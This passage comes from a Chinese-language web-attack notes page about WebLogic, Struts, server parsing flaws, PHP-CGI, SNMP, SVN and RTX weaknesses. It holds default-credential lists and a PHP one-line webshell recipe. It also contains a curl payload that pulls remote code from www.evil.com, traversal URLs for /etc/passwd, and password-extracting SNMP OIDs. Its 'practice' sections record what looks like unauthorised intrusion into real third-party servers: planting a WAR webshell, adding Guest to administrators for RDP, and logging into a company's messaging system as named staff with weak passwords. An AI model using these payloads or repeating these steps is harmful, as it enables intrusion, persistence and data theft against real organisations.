class="keyword">password</span></span><br><span class="line"></span><br><span class="line">Oracle-WebLogic Process Integrator：wlcsystem / wlcsystem</span><br><span class="line"></span><br><span class="line">Oracle-WebLogic Process Integrator：wlpisystem / wlpisystem</span><br></pre></td></tr></table></figure>
+
+<p>查看wooyun漏洞案例，积累常见弱口令：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">weblogic</span> / weblogic<span class="number">123</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">weblogic</span> / <span class="number">12345678</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">admin</span> / <span class="number">12345678</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="4-2-利用方式"><a href="#4-2-利用方式" class="headerlink" title="4.2 利用方式 "></a>4.2 利用方式 </h2><p>寻找weblogic服务器方法：</p>
+<ul>
+<li><p>使用 IIS PUT Scaner<br>扫描80、8080端口，查看HTTP<br>banner信息，确定为weblogic；</p>
+</li>
+<li><p>直接扫描7001端口或者baidu<br>inurl: :7001/console (待尝试)</p>
+</li>
+</ul>
+<p>利用弱口令进入管理后台，在控制台部署一个web应用：</p>
+<p>Deploy =&gt; web application modules =&gt; Deploy a new Web Application<br>Module… =&gt;upload your file(s) =&gt; Deploy</p>
+<p>在Web应用中包含模块：必须要有一个servlet或JSP<br>web.xml文件，包含web应用程序的信息</p>
+<h2 id="4-3-安全配置"><a href="#4-3-安全配置" class="headerlink" title="4.3 安全配置 "></a>4.3 安全配置 </h2><p><a target="_blank" rel="noopener" href="http://download.oracle.com/docs/cd/E12890/_01/ales/docs32/integrateappenviron/configWLS.html/#wp1099454">http://download.oracle.com/docs/cd/E12890\_01/ales/docs32/integrateappenviron/configWLS.html\#wp1099454</a></p>
+<h2 id="4-4-现学现卖"><a href="#4-4-现学现卖" class="headerlink" title="4.4 现学现卖 "></a>4.4 现学现卖 </h2><p><a target="_blank" rel="noopener" href="http://xx.xx.xx.xx:7001/console/login/LoginForm.jsp">http://xx.xx.xx.xx:7001/console/login/LoginForm.jsp</a></p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_a09bb089c1c3b312.png"></p>
+<p>weblogic / 12345678</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_6d6c9016367bb35b.png"></p>
+<p>部署war包（war包其实是index.jsp + META-INF + WEB-INF的压缩包）：</p>
+<p>先制作war包（需安装java环境）：</p>
+<p>c:\app&gt;cd c:/program files/java/dk1.8.0_31/bin</p>
+<p>c:\Program Files\Java\jdk1.8.0_31\bin&gt;jar -cvf app.war c:/app</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_3493c9640cf370ac.png"></p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_ba1e3acff7df0d95.png"></p>
+<p>部署——&gt;安装——&gt;上载文件——&gt;一直点确定即可，得到shell</p>
+<p>（自己制作war包失败，重新下载了一个war包，上传）</p>
+<p><a target="_blank" rel="noopener" href="http://xx.xx.xx.xx:7001/index/a.jsp">http://xx.xx.xx.xx:7001/index/a.jsp</a> (安全起见，已删除)</p>
+<p><a target="_blank" rel="noopener" href="http://xx.xx.xx.xx:7001/index/a.jsp?sort=1&amp;dir=E:%5C%5Cphpstudy%5C%5CWWW">http://xx.xx.xx.xx:7001/index/a.jsp?sort=1&amp;dir=E%3A\\phpstudy\\WWW</a></p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_cf68ba09dbca62df.png"></p>
+<p>翻目录：</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_63592e979d64fae2.png"></p>
+<p><a target="_blank" rel="noopener" href="http://xx.xx.xx.xx/weimall">http://xx.xx.xx.xx/weimall</a> mall.xx.cn v.xx.cn</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_b9a7ba7d2ab3078c.png"></p>
+<p><a target="_blank" rel="noopener" href="http://xx.xx.xx.xx/fenxiao/">http://xx.xx.xx.xx/fenxiao/</a> 米某网 </p>
+<p><a target="_blank" rel="noopener" href="http://xx.x.xx.xx/fenxiao/api/client/uc.php">http://xx.x.xx.xx/fenxiao/api/client/uc.php</a> youxiu<br>（已修改时间，该shell好用）</p>
+<p><code>net user</code></p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_d3ed608fe971124a.png"></p>
+<p><code>net user Guest xiuyou!</code></p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_6ea978c38fc505e6.png"></p>
+<p><code>net localgroup administrators</code></p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_eae0acb1c41ca212.png"></p>
+<p><code>net localgroup administrators Guest /add</code></p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_60b78b69da695ec6.png"></p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_30d1210394b8be38.png"></p>
+<p>mstsc打开远程终端，<code>Guest / xiuyou!</code></p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_f8671774fb643b0f.png"></p>
+<p>激活Guest用户 <code>net user Guest /active:yes</code></p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_880a526fcaa8650a.png"></p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_25d3715c70e27e3d.png"></p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_790c103cd138a9e2.png"></p>
+<h1 id="5-struts漏洞"><a href="#5-struts漏洞" class="headerlink" title="5 struts漏洞 "></a>5 struts漏洞 </h1><p>drops.wooyun.org/papers/902</p>
+<p>sebug.net/appdir/Apache+Struts</p>
+<p>Struts是Apache软件基金会Jakarta项目组的一个开源项目，它采用MVC模式，帮助java开发者利用J2EE开发Web应用，可以用来构件复杂的Web应用。它允许我们分解一个应用程序的商业逻辑、控制逻辑和表现逻辑的代码，使它的重用性和维护性更好。</p>
+<h2 id="5-1-S2-016命令执行漏洞"><a href="#5-1-S2-016命令执行漏洞" class="headerlink" title="5.1 S2-016命令执行漏洞 "></a>5.1 S2-016命令执行漏洞 </h2><p>在struts2中，DefaultActionMapper类支持以”action:”、”redirect:”、”redirectAction:”作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令。redirect:和redirectAction:此两项前缀为Struts默认开启功能，目前Struts<br>2.3.15.1以下版本均存在此漏洞。</p>
+<h2 id="5-2-S2-017重定向漏洞"><a href="#5-2-S2-017重定向漏洞" class="headerlink" title="5.2 S2-017重定向漏洞 "></a>5.2 S2-017重定向漏洞 </h2><p>Apache Struts<br>2.0.0没有有效过滤”redirect:”/“redirectAction:”参数前缀内容，存在多个开放重定向漏洞，攻击者通过构建特制的URI并诱使用户点击，利用这些漏洞将这些用户重定向到攻击者控制的站点，执行钓鱼攻击。</p>
+<h2 id="5-3-S2-019命令执行漏洞"><a href="#5-3-S2-019命令执行漏洞" class="headerlink" title="5.3 S2-019命令执行漏洞"></a>5.3 S2-019命令执行漏洞</h2><p>Struts2 是第二代基于Model-View-Controller<br>(MVC)模型的java企业级web应用框架。Apache<br>Struts 2.3.15.2之前版本的“Dynamic Method<br>Invocation”机制是默认开启的，仅提醒用户如果可能的情况下关闭此机制，这样就存在远程代码执行漏洞，远程攻击者可利用此漏洞在受影响应用上下文中执行任意代码。</p>
+<h1 id="6-web服务器解析漏洞"><a href="#6-web服务器解析漏洞" class="headerlink" title="6 web服务器解析漏洞 "></a>6 web服务器解析漏洞 </h1><p><a target="_blank" rel="noopener" href="http://www.cnseay.com/806/">www.cnseay.com/806/</a></p>
+<h2 id="6-1-IIS-6-0"><a href="#6-1-IIS-6-0" class="headerlink" title="6.1 IIS 6.0 "></a>6.1 IIS 6.0 </h2><ul>
+<li><p>后缀解析： /xx.asp;.jpg</p>
+</li>
+<li><p>目录解析： /xx.asp/xx.jpg<br>（xx.asp目录下可解析任何文件）</p>
+</li>
+<li><p>默认解析： xx.asa xx.cer xx.cdx<br>（IIS默认配置中，该类文件由asp.dll解析）</p>
+</li>
+<li><p>发散思维： /xx.asa/xx.jpg /xx.cer/xx.jpg /xx.cdx/xx.jpg</p>
+</li>
+</ul>
+<h2 id="6-2-IIS-7-0-IIS-7-5-Nginx-lt-0-8-37"><a href="#6-2-IIS-7-0-IIS-7-5-Nginx-lt-0-8-37" class="headerlink" title="6.2 IIS 7.0/IIS 7.5/Nginx&lt;=0.8.37 "></a>6.2 IIS 7.0/IIS 7.5/Nginx&lt;=0.8.37 </h2><p>默认Fast-CGI开启状况下，在文件路径（/xx.jpg）后加上/xx.php，即/xx.jpg/xx.php会被解析为php文件。</p>
+<p>xx.jpg为一句话图片马，制作过程如下：</p>
+<p><code>copy yy.jpg/b + zz.txt/a xx.jpg</code></p>
+<p>/b：二进制模式</p>
+<p>/a：ASCII模式</p>
+<p>yy.jpg ：正常图片文件</p>
+<p>zz.txt ：一句话 &lt;?PHP<br>fputs(fopen(‘shell.php’,’w’),’&lt;?PHP<br>eval($_POST\youxiu)?&gt;’);?&gt;</p>
+<p>shell.php youxiu</p>
+<h2 id="6-3-Nginx-lt-0-8-37"><a href="#6-3-Nginx-lt-0-8-37" class="headerlink" title="6.3 Nginx&lt;=0.8.37 "></a>6.3 Nginx&lt;=0.8.37 </h2><p>在Fast-CGI关闭的情况下，Nginx仍然存在解析漏洞：</p>
+<p>在文件路劲(xx.jpg)后面加上%00.php ，即<br>xx.jpg%00.php<br>会被当做php文件来解析</p>
+<p>参照《Nginx空字节可远程执行代码漏洞》</p>
+<h2 id="6-4-Apache"><a href="#6-4-Apache" class="headerlink" title="6.4 Apache "></a>6.4 Apache </h2><ul>
+<li>后缀解析： test.php.x1.x2.x3<br>（x1,x2,x3为没有在mime.types文件中定义的文件类型）</li>
+</ul>
+<p>Apache将从右往左开始判断后缀，若x3为非可识别后缀，则判断x2，直到找到可识别后缀为止，然后对可识别后缀进行解析。</p>
+<p>Apache可解析： php | php3 | phtml</p>
+<p>参照《Apache漏洞之后缀名解析漏洞》</p>
+<p>防范：在apache配置文件中添加禁止.php文件执行的语句：</p>
+<p>&lt;Files ~ ”.(php.|php3.|phtml.)”&gt;</p>
+<p>Order Allow,Deny</p>
+<p>Deny from all</p>
+<p>&lt;/Files&gt;</p>
+<ul>
+<li>若在Apache中，<br>.htaccess可被应用（即<br>AllowOverride=All）</li>
+</ul>
+<p>.htaccess可被上传</p>
+<p>则在.htaccess中写入<br>(shell.jpg为上传文件，便可得到shell)</p>
+<p>&lt;FilesMatch “shell.jpg”&gt; SetHandler application/x-httpd-php<br>&lt;/FilesMatch&gt;</p>
+<h2 id="6-5-lighttpd"><a href="#6-5-lighttpd" class="headerlink" title="6.5 lighttpd "></a>6.5 lighttpd </h2><p>xx.jpg/xx.php</p>
+<h2 id="6-6-windows环境"><a href="#6-6-windows环境" class="headerlink" title="6.6 windows环境 "></a>6.6 windows环境 </h2><p>Windows环境下，文件 xx.jpg[空格]</p>
+<p>文件 xx.jpg.</p>
+<p>两类文件不允许存在。若这样命名，windows会自动除去空格和点，从而被利用。</p>
+<h1 id="7-PHP-CGI远程任意代码执行漏洞"><a href="#7-PHP-CGI远程任意代码执行漏洞" class="headerlink" title="7 PHP-CGI远程任意代码执行漏洞 "></a>7 PHP-CGI远程任意代码执行漏洞 </h1><p>zone.wooyun.org/content/151</p>
+<p><a target="_blank" rel="noopener" href="http://www.hackbase.com/tech/2012-05-07/66395.html">www.hackbase.com/tech/2012-05-07/66395.html</a></p>
+<p>该漏洞是用户将HTTP请求参数提交至Apache服务器，通过mod_cgi模块交给后端的php-cgi处理，但在执行过程中部分字符没有得到处理，比如空格、等号（=）、减号（-）等。利用这些字符，攻击者可以向后端的php-cgi解析程序提交恶意数据，php-cgi会将这段“数据”当做php参数直接执行，目前截获到的攻击主要利用以下PHP参数：</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_7505e63d7f39ad25.png"></p>
+<h2 id="7-1-本地包含执行代码"><a href="#7-1-本地包含执行代码" class="headerlink" title="7.1 本地包含执行代码 "></a>7.1 本地包含执行代码 </h2><p>curl -H “USER-AGENT: &lt;?system(‘id’);die();?&gt;”</p>
+<p><a target="_blank" rel="noopener" href="http://target.com/test.php?-dauto%5C_prepend%5C_file=/proc/self/environ+-n">http://target.com/test.php?-dauto\_prepend\_file%3d/proc/self/environ+-n</a> </p>
+<p>（/proc/self/environ 为本地文件路径）</p>
+<h2 id="7-2-远程包含执行代码"><a href="#7-2-远程包含执行代码" class="headerlink" title="7.2 远程包含执行代码 "></a>7.2 远程包含执行代码 </h2><p>Curl<br><a target="_blank" rel="noopener" href="http://target.com/test.php?-dallow%5C_url%5C_include=On+-dauto%5C_prepend%5C_file=http://www.evil.com/evil.txt">http://target.com/test.php?-dallow\_url\_include%3dOn+-dauto\_prepend\_file%3dhttp%3a%2f%2Fwww.evil.com%2fevil.txt</a> </p>
+<p>（%3d = %3a : %2f / ）</p>
+<p>（<a target="_blank" rel="noopener" href="http://www.evail.com/evil.txt%E4%B8%BA%E6%9C%A8%E9%A9%AC%E6%96%87%E4%BB%B6%EF%BC%89">http://www.evail.com/evil.txt为木马文件）</a></p>
+<h1 id="8-FCK编辑器上传漏洞"><a href="#8-FCK编辑器上传漏洞" class="headerlink" title="8 FCK编辑器上传漏洞 "></a>8 FCK编辑器上传漏洞 </h1><h2 id="8-1-漏洞利用"><a href="#8-1-漏洞利用" class="headerlink" title="8.1 漏洞利用 "></a>8.1 漏洞利用 </h2><ul>
+<li><p>编辑器本身存在漏洞：更多参见《后台编辑器漏洞手册》</p>
+</li>
+<li><p>编辑器 + web服务器解析漏洞</p>
+</li>
+<li><p>突破后台建立文件夹漏洞（. 变<br>_）</p>
+</li>
+</ul>
+<h1 id="9-Apache-Server-Status对外暴露"><a href="#9-Apache-Server-Status对外暴露" class="headerlink" title="9 Apache Server Status对外暴露 "></a>9 Apache Server Status对外暴露 </h1><p><a target="_blank" rel="noopener" href="http://www.ccvita.com/333.html">www.ccvita.com/333.html</a></p>
+<p>Apache 1.3.2及之后的版本自带查看Apache状态的功能模块<br>server-status，若设置不严（对公网开放），就会造成信息泄露，例如：真实IP、性能信息、客户端IP、旁站信息等。</p>
+<h2 id="9-1-利用方式"><a href="#9-1-利用方式" class="headerlink" title="9.1 利用方式 "></a>9.1 利用方式 </h2><p>未做限制访问的URL为：<a target="_blank" rel="noopener" href="http://www.apache.org/server-status">http://www.apache.org/server-status</a></p>
+<h1 id="10-网站备份文件可下载"><a href="#10-网站备份文件可下载" class="headerlink" title="10 网站备份文件可下载 "></a>10 网站备份文件可下载 </h1><p>该问题可能导致源代码泄露，获取web.conf文件，从中得到数据库密码，导致进一步渗透。</p>
+<h2 id="10-1-利用方式"><a href="#10-1-利用方式" class="headerlink" title="10.1 利用方式 "></a>10.1 利用方式 </h2><p>常见备份目录为：</p>
+<p><a target="_blank" rel="noopener" href="http://www.xxx.com/xxx.rar">http://www.xxx.com/xxx.rar</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.xxx.com/xxx.zip">http://www.xxx.com/xxx.zip</a></p>
+<p><a target="_blank" rel="noopener" href="http://aaa.xxx.com/aaa.rar">http://aaa.xxx.com/aaa.rar</a></p>
+<p><a target="_blank" rel="noopener" href="http://bbb.xxx.com.cn/bbb.tar">http://bbb.xxx.com.cn/bbb.tar</a></p>
+<p><a target="_blank" rel="noopener" href="http://bbb.xxx.com/sysadmin.tar.gz">http://bbb.xxx.com/sysadmin.tar.gz</a></p>
+<p>ip/<a target="_blank" rel="noopener" href="http://www.xxx.com.zip/">www.xxx.com.zip</a></p>
+<ul>
+<li><p>直接在URL中访问，然后下载</p>
+</li>
+<li><p>使用curl工具 例如： curl -I<br><a target="_blank" rel="noopener" href="http://www.fff.com/fff.zip">http://www.fff.com/fff.zip</a></p>
+</li>
+</ul>
+<p>（curl是利用URL语法在命令行下工作的开原文件传输工具）</p>
+<h1 id="11-目录遍历并查看敏感数据"><a href="#11-目录遍历并查看敏感数据" class="headerlink" title="11 目录遍历并查看敏感数据 "></a>11 目录遍历并查看敏感数据 </h1><p>这类漏洞的危害可大可小，一般都是结合具体环境来利用。</p>
+<h2 id="11-1-利用方式"><a href="#11-1-利用方式" class="headerlink" title="11.1 利用方式 "></a>11.1 利用方式 </h2><p>根据从wooyun上看到的漏洞，其发现方式主要有:</p>
+<ul>
+<li><p>wvs扫描目录 (inc，<br>返回312，直接访问看到目录列表)</p>
+</li>
+<li><p>常见泄露路径：</p>
+</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="http://www.xxx.com/caches">http://www.xxx.com/caches</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.xxx.com/database">http://www.xxx.com/database</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.xxx.com/..%2f..%2f..%2f..%2fetc%2fpasswd">http://www.xxx.com/..%2f..%2f..%2f..%2fetc%2fpasswd</a></p>
+<h1 id="12-SNMP信息泄露"><a href="#12-SNMP信息泄露" class="headerlink" title="12 SNMP信息泄露 "></a>12 SNMP信息泄露 </h1><p>drops.wooyun.org/tips/409</p>
+<h2 id="12-1-基本原理"><a href="#12-1-基本原理" class="headerlink" title="12.1 基本原理 "></a>12.1 基本原理 </h2><p>SNMP（简单网络管理协议）：该协议能够支持网络管理系统，用以监测连接到网络上的设备是否有任何引起管理上关注的情况。目前共有V1、V2、V3三个版本，应用比较广泛的还是前两个版本，同时存在安全问题也较多。</p>
+<p>Cacti、Mrtg等监控工具都基于snmp协议。其原理可以简单理解为：</p>
+<p>管理主机向被管理的主机或设备发送一个请求（包含community和oid）</p>
+<p>（community相当于认证口令）</p>
+<p>（oid为代号，例如112代表CPU使用率，113代表内存使用率）</p>
+<p>被管理设备收到请求后先查看community是否与自己保持的一致，若一致则返回请求</p>
+<p>信息，若不一致则不返回任何信息。</p>
+<p>此外，管理主机通过snmp协议除了可以获取被管理主机的信息外，还可以修改其配置</p>
+<p>信息（主要是路由交换设备方面）。</p>
+<h2 id="12-2-snmp弱口令"><a href="#12-2-snmp弱口令" class="headerlink" title="12.2 snmp弱口令 "></a>12.2 snmp弱口令 </h2><p>snmp服务器的默认密码为public，漏洞发现与扫描：</p>
+<ul>
+<li><p>x-scan扫描 + GFI LANGard利用</p>
+</li>
+<li><p>使用Snmp Digger进行漏洞利用</p>
+</li>
+<li><p>snmputil.exe</p>
+</li>
+</ul>
+<p>snmputil.exe get|getnext|walk agent community oid[oid……]</p>
+<p>当前进程列表 snmputil.exe walk ip public<br>.1.3.6.1.2.1.25.4.2.1.2</p>
+<p>系统用户列表 snmputil.exe walk ip public<br>.1.3.6.1.4.1.77.1.2.25.1.1</p>
+<p>列 出 域 名 snmputil.exe walk ip public<br>.1.3.6.1.4.1.77.1.4.1.0</p>
+<p>列出安装软件 snmputil.exe walk ip public<br>.1.3.6.1.2.1.25.6.3.1.2</p>
+<p>列出系统信息 snmputil.exe walk ip public .1.3.6.1.2.1.1</p>
+<ul>
+<li>IP Network<br>Browser（snmp浏览工具）</li>
+</ul>
+<h2 id="12-3-snmp获取管理员密码"><a href="#12-3-snmp获取管理员密码" class="headerlink" title="12.3 snmp获取管理员密码 "></a>12.3 snmp获取管理员密码 </h2><p>snmp默认开放端口: 161</p>
+<ul>
+<li>H3C防火墙：通过SNMP只读权限的团体字符串便可以读到管理密码，从而控制设备。（WooYun-2013-21877(<a target="_blank" rel="noopener" href="http://www.wooyun.org/bugs/wooyun-2013-021877)%EF%BC%89">http://www.wooyun.org/bugs/wooyun-2013-021877)）</a></li>
+</ul>
+<p>扫描工具：<br>solarwinds中的snmpsweep</p>
+<p>升级版：solarwinds工具包中的 ip browser</p>
+<ul>
+<li>华为quidway三层交换</li>
+</ul>
+<p>利用这个OID读出的密码为明文（WooYun-2013-21964(<a target="_blank" rel="noopener" href="http://www.wooyun.org/bugs/wooyun-2013-021964)%EF%BC%89">http://www.wooyun.org/bugs/wooyun-2013-021964)）</a></p>
+<p>root@bt:~# snmpwalk -c private -v 1 x.x.x.x<br>1.3.6.1.4.1.2011.5.2.1.10.1</p>
+<p>对于存在该漏洞的设备，目前已知可以获取帐号的oid有一下三个（walk）:</p>
+<p>1.3.6.1.4.1.2011.5.2.1.10.1</p>
+<p>1.3.6.1.4.1.2011.10.2.12.1.1.1</p>
+<p>1.3.6.1.4.1.25506.2.12.1.1.1</p>
+<h2 id="12-4-实战演练"><a href="#12-4-实战演练" class="headerlink" title="12.4 实战演练 "></a>12.4 实战演练 </h2><p><code>snmpwalk -v 2c -c public xx.xx.xx.xx</code></p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_41e07a3a71e3e362.png"></p>
+<h1 id="13-SVN源码泄露"><a href="#13-SVN源码泄露" class="headerlink" title="13 SVN源码泄露 "></a>13 SVN源码泄露 </h1><p>drops.wooyun.org/tips/352(<a target="_blank" rel="noopener" href="http://drops.wooyun.org/tips/352">http://drops.wooyun.org/tips/352</a>)</p>
+<h2 id="13-1-SVN介绍"><a href="#13-1-SVN介绍" class="headerlink" title="13.1 SVN介绍 "></a>13.1 SVN介绍 </h2><p>Subversion，简称SVN，是一个开放源代码的版本控制系统。在开源软件的开发过程中，由于开发方式自由和开发人员分散等特性，版本控制问题一直关系到项目成败，没有版本控制开源软件的开发过程就会变得混乱和不可控制。</p>
+<p>Subversion使用服务端—客户端的结构（当然服务端与客户端可以都运行在同一台服务器上）。在服务端是存放着所有受控制数据的Subversion仓库，另一端是Subversion的客户端程序，管理着受控数据的一部分在本地的映射（称为“工作副本”）。两端间通过各种仓库存取层（Repository<br>Access，简称RA）的多条通道（通道中可以通过不同的网络协议比如HTTP、SSH或本地文件等）进行访问的。</p>
+<p>svn默认端口是3690</p>
+<h2 id="13-2-漏洞原理"><a href="#13-2-漏洞原理" class="headerlink" title="13.2 漏洞原理 "></a>13.2 漏洞原理 </h2><p>程序导出方式：</p>
+<p>在现实开发环境中，建议使用导出功能svn<br>export（而不是svn co）</p>
+<p>svn co ：【导出结果带 .svn<br>文件夹的目录树】</p>
+<p>svn co http://路径[本地目录全路径]<br>–username 用户名 –password 密码</p>
+<p>svn co svn://路径[本地目录全路径]<br>–username 用户名 –password 密码</p>
+<p>svn export ：【导出结果不带 .svn<br>文件夹的目录树】</p>
+<p>svn export [-r版本号]<br>http://路径[本地目录全路径] –username<br>用户名 –password 密码</p>
+<p>svn export [-r版本号]<br>svn://路径[本地目录全路径] –username<br>用户名 –password 密码</p>
+<p>漏洞产生原因：</p>
+<p>在实际开发环境中，很管理员直接把svn<br>co导出来的代码放到web目录下，致使 .svn<br>隐藏文件夹暴露于外网环境中，恶意攻击者可以借助其中包含的用于版本信息追踪的“entries”文件逐步摸清站点结构。</p>
+<p>漏洞利用方式：</p>
+<p>若 .svn目录没有做访问权限限制，可以通过<br>.svn 来遍历文件和目录列表。</p>
+<p>若<br>*.php.svn-base被当做php来执行，若暴露php错误信息(真实路径)或空白内容，则该站点存在扩展名问题，找文件上传处上传xx.php.gif文件获取webshell。</p>
+<p>若<br>*.php.svn-base不当做php文件执行，则可下载svn中的所有php源码文件。</p>
+<ul>
+<li><p>直接在浏览器中访问 /.svn/entries</p>
+</li>
+<li><p>利用seay的svn工具</p>
+</li>
+</ul>
+<h1 id="14-hadhoop应用对外访问"><a href="#14-hadhoop应用对外访问" class="headerlink" title="14 hadhoop应用对外访问 "></a>14 hadhoop应用对外访问 </h1><h2 id="14-1-基础概念"><a href="#14-1-基础概念" class="headerlink" title="14.1 基础概念 "></a>14.1 基础概念 </h2><p>Hadoop是一个由apache基金会所开发的分布式系统基础架构。用户可以在不了解分布式底层细节的情况下，开发分布式程序。充分利用集群的威力进行高速运算和存储。</p>
+<h2 id="14-2-漏洞利用"><a href="#14-2-漏洞利用" class="headerlink" title="14.2 漏洞利用 "></a>14.2 漏洞利用 </h2><p>默认开放端口：</p>
+<p>hadoop 50070</p>
+<p>hbase 50075</p>
+<p>hdfs 50090</p>
+<ul>
+<li><p>Hadoop管理界面弱口令，例如：admin 123456<br>WooYun-2014-58320(<a target="_blank" rel="noopener" href="http://www.wooyun.org/bugs/wooyun-2014-058320">http://www.wooyun.org/bugs/wooyun-2014-058320</a>)</p>
+</li>
+<li><p>Hadoop远程命令执行，通过hadoop，hbase，hdfs0.2<br>RC版本的管理web端能远程执行命令（jstack<br>pstack<br>servlet执行命令），通过该节点对集群服务器进行任务分发（该项是基本功能，可以进行批量提权linux主机），从而渗透进hadoop集群。<br>WooYun-2013-20282(<a target="_blank" rel="noopener" href="http://www.wooyun.org/bugs/wooyun-2013-020282">http://www.wooyun.org/bugs/wooyun-2013-020282</a>)</p>
+</li>
+</ul>
+<h1 id="15-Nagios信息泄露"><a href="#15-Nagios信息泄露" class="headerlink" title="15 Nagios信息泄露 "></a>15 Nagios信息泄露 </h1><p>Nagios是一个监视系统运行状态和网络信息的监视系统。Nagios能监视所指定的本地或远程主机及服务，可运行在linux、unix平台上，同时提供一个基于浏览器的WEB界面以方便系统管理人员查看网络状态，各种系统问题以及日志等等。</p>
+<h2 id="15-1-漏洞利用"><a href="#15-1-漏洞利用" class="headerlink" title="15.1 漏洞利用 "></a>15.1 漏洞利用 </h2><p>Nagios运维监控API接口暴露<br>WooYun-2014-86842(<a target="_blank" rel="noopener" href="http://wooyun.org/bugs/wooyun-2014-086842">http://wooyun.org/bugs/wooyun-2014-086842</a>)</p>
+<h1 id="16-RTX即时通信信息泄露"><a href="#16-RTX即时通信信息泄露" class="headerlink" title="16 RTX即时通信信息泄露 "></a>16 RTX即时通信信息泄露 </h1><p>腾讯通RTX(Real Time<br>eXchange)是腾讯公司推出的企业级即时通信平台。企业员工可以轻松地通过服务器配置的组织架构查找需要进行通信的人员，并采用丰富的沟通方式进行实时沟通。文本消息、文本传输、直接语音会话或者视频的形式满足不同办公环境下的沟通需求。</p>
+<h2 id="16-1-漏洞利用"><a href="#16-1-漏洞利用" class="headerlink" title="16.1 漏洞利用 "></a>16.1 漏洞利用 </h2><p>默认开放端口： 8012</p>
+<ul>
+<li>开放应用端口暴露：<br><a target="_blank" rel="noopener" href="http://xx.xx.xx.xx:8012/userlist.php">http://xx.xx.xx.xx:8012/userlist.php</a></li>
+</ul>
+<p>直接可以访问到所有用户id、用户名等信息的json</p>
+<p>在“查看审核结果处”尝试用户名+弱口令(3102<br>或123456)登陆，登陆成功后即进入内部网络。</p>
+<ul>
+<li>得到用户名后，可以读取手机号</li>
+</ul>
+<p>用户名： rtx.bxlq.com/userlist.php</p>
+<p>手机号：<br>rtx.bxlq.com/getmobile.cgi?receiver=用户名</p>
+<h2 id="16-2-动手实践"><a href="#16-2-动手实践" class="headerlink" title="16.2 动手实践 "></a>16.2 动手实践 </h2><p><a target="_blank" rel="noopener" href="http://xx.xx.xx.xx:8012/userlist.php">http://xx.xx.xx.xx:8012/userlist.php</a> 中国某公司</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_e1c2ee9745806f6d.png"></p>
+<p>回到首页，查看审核结果处，进行弱口令尝试：高X军<br>/ 123456</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_7d72e064c94b344c.png"></p>
+<p>回到首页，下载并安装客户端进行登陆</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_7624c1251b81f7c6.png"></p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_da7cf1ecb96eb2d.png"></p>
+<p>一直连接不上，最后用nmap扫描端口，一个个尝试，最终确定为9002</p>
+<p>高X军 123456</p>
+<p>桂X林 123456</p>
+<p>孔X月 123456</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_9c42e03c9ee49942.png"></p>
+<p>公司领导</p>
+<p><img src="%5Cassets%5Cimg%5C%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4%5Cfile_html_4baa431beadedd58.png"></p>
